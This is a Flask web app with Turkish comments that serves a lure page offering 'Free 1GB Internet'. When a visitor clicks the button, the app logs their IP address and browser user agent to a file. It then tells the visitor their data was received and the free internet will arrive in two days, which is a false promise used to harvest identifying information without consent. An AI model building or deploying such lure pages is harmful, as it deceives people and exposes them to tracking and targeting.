from flask import Flask, request, render_template_string
import logging
from logging.handlers import RotatingFileHandler
import os

app = Flask(__name__)

# Log dizini ve dosyası: Log dosyalarının düzenli tutulması için bir klasör kullanılıyor
log_dir = 'logger'
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, 'ip.log')

# RotatingFileHandler kullanarak log dosyasının boyutu 100 KB'a ulaştığında yedek dosyalar oluşturulacak
handler = RotatingFileHandler(log_file, maxBytes=100000, backupCount=3)
formatter = logging.Formatter('%(asctime)s - IP: %(ip)s - Tarayıcı: %(user_agent)s')
handler.setFormatter(formatter)

logger = logging.getLogger('ip_logger')
logger.setLevel(logging.INFO)
logger.addHandler(handler)

# Ana sayfa için HTML içeriği
INDEX_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Bedava 1GB İnternet</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        h1 { color: #333; }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Bedava 1GB İnternet</h1>
    <form action="/collect-data" method="post">
        <button type="submit">Tıkla!</button>
    </form>
</body>
</html>
"""

# Toplanan bilgileri göstermek için HTML şablonu
DATA_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>1GB Aldın!</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        h1 { color: #333; }
        ul { list-style: none; padding: 0; }
        li { padding: 8px 0; }
        strong { color: #555; }
    </style>
</head>
<body>
    <h1>Verileriniz Alındı.</h1>
    <h2>2 Gün İçinde Gelecektir. Sabırlı Olun.</h2>
    <ul>
        <li><strong>IP Adresi:</strong> {{ ip_address }}</li>
        <li><strong>Tarayıcı:</strong> {{ user_agent }}</li>
    </ul>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(INDEX_HTML)

@app.route('/collect-data', methods=['POST'])
def collect_data():
    # Proxy arkasındaysanız gerçek IP'yi almak için X-Forwarded-For kontrolü
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')

    # Logger'a ekstra veriler ekleyerek log kaydı alıyoruz
    extra = {'ip': ip_address, 'user_agent': user_agent}
    logger.info("", extra=extra)

    return render_template_string(DATA_HTML, ip_address=ip_address, user_agent=user_agent)

if __name__ == '__main__':
    # Production ortamında debug=False olmalıdır.
    app.run(debug=False, host='0.0.0.0', port=5000)
